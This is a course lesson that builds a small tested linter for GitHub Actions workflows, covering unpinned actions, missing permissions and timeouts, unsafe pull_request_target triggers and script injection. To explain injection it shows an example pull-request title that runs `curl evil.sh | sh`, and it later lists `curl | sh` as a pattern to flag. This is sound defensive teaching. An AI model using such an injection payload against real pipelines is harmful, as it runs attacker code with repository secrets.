---
description: "Level 2 project: a tested GitHub Actions workflow linter for unpinned actions, missing permissions and timeouts, injection and unsafe triggers."
---

# 10 · Project — A Workflow Linter

CI configuration is code that runs with credentials, so it deserves the same review and static checks as application code. This project builds `wflint.py`, a small linter for GitHub Actions workflow files, that catches six common problems from this level and from Level 1. It is a **teaching subset**: for real use, prefer a maintained tool such as actionlint and a security scanner; they know far more rules and the exact expression grammar.

!!! note "What was run"
    The linter has **17 pytest tests, all passing on the first run**, plus two demos on this course's own files. It parses YAML with PyYAML and is run on macOS. It was never run against a real, large collection of workflows, so its false-positive and false-negative rates on real code are **unknown**. The rules encode guidance from docs.github.com's security-hardening pages as I understand them (October 2026); they are not a complete security review.

## The rules

| Rule | Flags | Why it matters |
|---|---|---|
| W001 | No `permissions:` at the workflow level (and not every job sets one) | The token defaults to the repository setting, which may be read-write |
| W002 | `pull_request_target` workflow that checks out the PR head | Untrusted code running with a privileged token and secrets |
| W003 | `uses:` not pinned to a 40-hex commit SHA (also applies to reusable-workflow calls) | Tags and branches can be moved; a SHA cannot |
| W004 | Job without `timeout-minutes` | A hung job runs until the platform limit (hours) |
| W005 | Untrusted `${{ github.event... }}` inside `run:` or `github-script` | Script injection |
| W006 | Deploy-looking job with no `concurrency:` | Two runs can deploy at once; the older may finish last |

### Handling the `on:` trap

YAML 1.1 reads the bare words `on`, `off`, `yes`, `no` as booleans, so `on:` becomes the key `True` (Level 1 and Lesson 03 hit this). The linter's `triggers()` function looks up `doc.get(True, doc.get("on"))` and normalises the three syntaxes (`on: push`, `on: [push, pull]`, `on: {push: {...}}`) into a dict. A test asserts the quirk directly: after parsing, `True in d` and `"on" not in d`. Without this, every rule that depends on the trigger would silently never fire.

### Script injection (W005)

```yaml
- run: echo "Building ${{ github.event.pull_request.title }}"
```

`${{ ... }}` is expanded by the runner **into the script text before the shell runs it**. A pull-request title of `"; curl evil.sh | sh; echo "` becomes part of the command. The safe form passes the value as data:

```yaml
- run: echo "Building $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Now the shell reads `$TITLE` as a variable's value and does not parse it as code. The linter's pattern lists contexts an outsider controls (issue and PR titles and bodies, comment bodies, branch names, commit messages) and the tests check both directions: the unsafe form is flagged, the `env:` form and a safe context (`github.sha`) are not.

## Running it

On a deliberately bad workflow (`src/bad-workflow.yml`: `pull_request_target`, checks out the PR head, interpolates the title in `run`, deploys with no timeout/permissions/concurrency/pins):

```text
bad-workflow.yml: W001 ... no workflow-level `permissions:` ...
bad-workflow.yml: W002 deploy.steps[0]: pull_request_target checks out the PR head ...
bad-workflow.yml: W004 deploy: no `timeout-minutes` ...
bad-workflow.yml: W003 deploy.steps[0]: `actions/checkout@v4` not pinned to a full commit SHA ...
bad-workflow.yml: W005 deploy.steps[1]: untrusted `${{ github.* }}` value expanded inside `run:` ...
bad-workflow.yml: W006 deploy: looks like a deploy job with no `concurrency:` ...
```

All six rules fire. On Level 1's `src/ci.yml` (the sample workflow I wrote) it reports **4 findings, all W003**: the actions are pinned to tags (`@v4`, `@v5`), not SHAs. That is the linter being correct: my own sample was written for readability, and the course said so. Exit status is 1 if there are findings and 0 if none, so it works as a CI gate (`python3 wflint.py .github/workflows/*.yml`).

## What the tests teach about writing a linter

1. **Test both directions.** Each rule has a test that triggers it and a test that shows the safe form is not flagged (for example, job-level `permissions` satisfy W001; a local `./` action is not flagged by W003). A rule that only has positive tests will grow false positives.
2. **Start from a clean baseline workflow** (`GOOD`) and mutate one thing per test. The assertion `rules(GOOD) == []` guards against a rule that fires on everything.
3. **Know your limits.** W006 guesses "deploy" from words in job id, step names and commands (`deploy|release|publish|prod`). It will flag a job named `pre-release-notes` and miss a deploy called `ship`. Heuristic rules need a way to be suppressed, and a documented rate of error; this tool has the first only by editing the code.
4. **A linter is not a verifier.** It reads text; it cannot see that a step downloads and runs a script, or that a permitted action itself is malicious.

## Extending it

Useful next rules, each a small function plus tests: `actions/checkout` without `persist-credentials: false` where later steps run untrusted code; `curl | sh` in run steps; `secrets: inherit`; `runs-on: self-hosted` on a `pull_request` trigger in a public repository; `cancel-in-progress: true` on a deploy concurrency group; `if: always()` missing on report-upload steps. Wire it as a required check on the repository containing workflows, and keep an allowlist file with *dated* exceptions.

## Checklist

- The linter runs on every change to workflow files and exits non-zero on findings.
- Suppressions live in a dated allowlist file reviewed regularly.
- Each rule has a positive test, a negative test and an owner.
- The linter parses YAML; it does not pattern-match text.
- Composite actions and reusable workflows in other directories are scanned too.
- Findings include a location a human can find quickly.
- False positives are recorded and used to refine rules.
- Rule ids are stable so suppressions survive upgrades.

## How It Actually Works

The linter does no execution. `yaml.safe_load` turns the file into nested dictionaries and lists, and each rule walks that structure: iterating `jobs`, then `steps`, applying a regular expression to `uses:` values and `run:` text. Rules produce `(rule id, location, message)` tuples, where the location is the YAML path (`deploy.steps[1]`) so a human can find it; line numbers would need a position-preserving parser such as `ruamel.yaml`, which I did not use. The SHA check is a 40-character lowercase-hex regular expression, which assumes SHA-1 object IDs; if Git moves to SHA-256 IDs the rule will need updating. Because the whole tool is a pure function from parsed document to findings, every rule is unit-testable with a three-line YAML string, which is why it reached 17 tests with so little code.

## Common mistakes

- **Treating a clean lint run as "secure".** It checks six patterns.
- **Pattern-matching YAML as text** and tripping on quoting and anchors; parse it.
- **Forgetting the `True` key** and silently skipping trigger-based rules.
- **Rules without a suppression path**, leading people to delete the linter.
- **Failing the build on warnings you have not triaged**, which gets the gate disabled.
- **Only linting the main workflow directory** and missing composite actions and reusable workflows elsewhere.

## Exercise

1. Run `pytest src/test_wflint.py -v`, then run `wflint.py` on your own repository's workflow files. Triage each finding as fix, suppress with a reason, or false positive.
2. Add rule W007: flag `secrets: inherit` on reusable-workflow calls. Write the positive and negative tests first.
3. Make W006 less guessy by also checking `environment:` against a configurable list of protected environment names.
4. Write a short policy for when a linter finding may be suppressed, who approves it, and when the suppression expires.
